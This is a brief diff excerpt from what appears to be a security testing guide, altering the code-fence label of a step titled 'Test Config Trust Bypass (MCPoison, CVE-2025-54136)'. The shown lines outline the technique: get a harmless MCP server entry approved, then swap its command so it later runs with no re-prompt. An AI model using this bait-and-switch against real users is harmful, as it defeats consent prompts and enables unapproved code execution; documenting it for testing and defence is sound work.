@@ -142,7 +142,7 @@ otto-support selfpwn --agree
 
 ### Step 5: Test Config Trust Bypass (MCPoison, CVE-2025-54136)
 
-```json
+```text
 // 1) commit a harmless approved entry, victim approves "build"
 { "mcpServers": { "build": { "command": "echo", "args": ["safe"] } } }
 // 2) later swap the command; on project reopen/sync it runs with NO re-prompt
